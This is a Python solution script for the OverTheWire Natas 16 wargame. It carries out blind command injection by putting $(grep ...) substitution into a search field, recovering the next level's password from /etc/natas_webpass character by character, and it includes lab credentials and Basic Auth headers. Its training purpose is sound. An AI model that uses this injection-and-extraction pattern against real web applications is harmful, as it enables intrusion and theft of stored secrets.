import urllib.request
import re

chars=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
r_ex=re.compile(r"HTTP/1.1 200 OK")
m_ex=re.compile(r"Mrs")

buf=bytearray()

#the login for natas15 basic auth username & password are combined with a colon then utf-8 base64 is applied. This becomes Http header.
#natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
#Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==
#URL codes are needed for spaces and the unbalanced quote
# %20 = space
# %22 = "
# %60 = <
# %24 = $

#now we can try hacking!!

#we need to make effective request in a loop up to 32 characters long for the lenght of the password
#we are going to send an http request that will put the following string into the form field: $(grep {} /etc/natas_webpass/natas17)
#The curly braces replaced by our guessed password. The guess is appends 1 letter at a time in the loop below.
#The $() is command substitution. The result of the command is substituted in to the grep expresion on the server.
#byte by byte we guess partial password which occurs in the password file.
#the result returned by our grep of password (and appended with 'Mrs') does not exist in dictionary so the server grep returns empty.
#if we guess the wrong password our grep return empty, appended with 'Mrs' which does exists so the server grep returns 'Mrs' which we regex for in our script.
#The reason for using 'Mrs' is this combination of letter is unique in the dictionary so it can be used as true/false

pwd=""
#pwd="0SbnKBvH1RU7ksIb9uuLmI7sd"
for c in range(1,32):
	found=False
	for n in chars:
		#setup the http request
		newp=pwd+n
		req=urllib.request.Request("http://natas16.natas.labs.overthewire.org/index.php?needle=%24(grep+^{}+%2Fetc%2Fnatas_webpass%2Fnatas17)Mrs&submit=Search".format(newp))
		req.add_header('Authorization','Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==')
		r=urllib.request.urlopen(req)
		#print("HTTP GET status={0}".format(r.status))
		if r.status==200:
			buf=r.read()
			str=buf.decode("utf-8")
			#print(str)

			#Regex search for our 'Mrs' flag to identify password match
			h=re.search(m_ex,str)
			if h is not None:
				print("Try {0}: Got {1}".format(n,h.group()))
			else:
				pwd=pwd+n
				found=True
				re.purge()
				break
		else:
			print("HTTP Error")
	if not found:
		print("Error: Search Space Exhausted")
		exit()
	print("Pass: "+pwd)
#we have a request that can use looping to slowy get the password, try every letter until print(buf.decode("utf-8"))
